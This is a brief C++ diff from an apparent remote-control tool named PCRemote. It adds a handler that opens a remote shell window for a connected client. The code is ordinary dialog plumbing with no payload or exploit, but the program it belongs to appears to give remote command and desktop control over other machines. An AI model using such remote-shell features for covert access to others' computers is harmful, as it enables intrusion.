@@ -131,6 +131,7 @@ BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
 	//自定义消息
 	ON_MESSAGE(UM_ICONNOTIFY, OnIconNotify)  
 	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
+	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
 
 	ON_COMMAND(IDM_NOTIFY_CLOSE, &CPCRemoteDlg::OnNotifyClose)
 	ON_COMMAND(IDM_NOTIFY_SHOW, &CPCRemoteDlg::OnNotifyShow)
@@ -616,6 +617,21 @@ void CPCRemoteDlg::OnOnlineCmd()
 	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
+//打开终端管理窗口
+LRESULT CPCRemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext *pContext = (ClientContext*)lParam;
+
+	CShellDlg *pDlg = new CShellDlg(this, m_iocpServer,pContext);
+
+	pDlg->Create(IDD_SHELL, GetDesktopWindow());
+	pDlg->ShowWindow(SW_SHOW);
+
+	pContext->m_Dialog[0] = SHELL_DLG;
+	pContext->m_Dialog[1] = (int)pDlg;
+
+	return 0;
+}
 
 void CPCRemoteDlg::OnOnlineDesktop()
 {
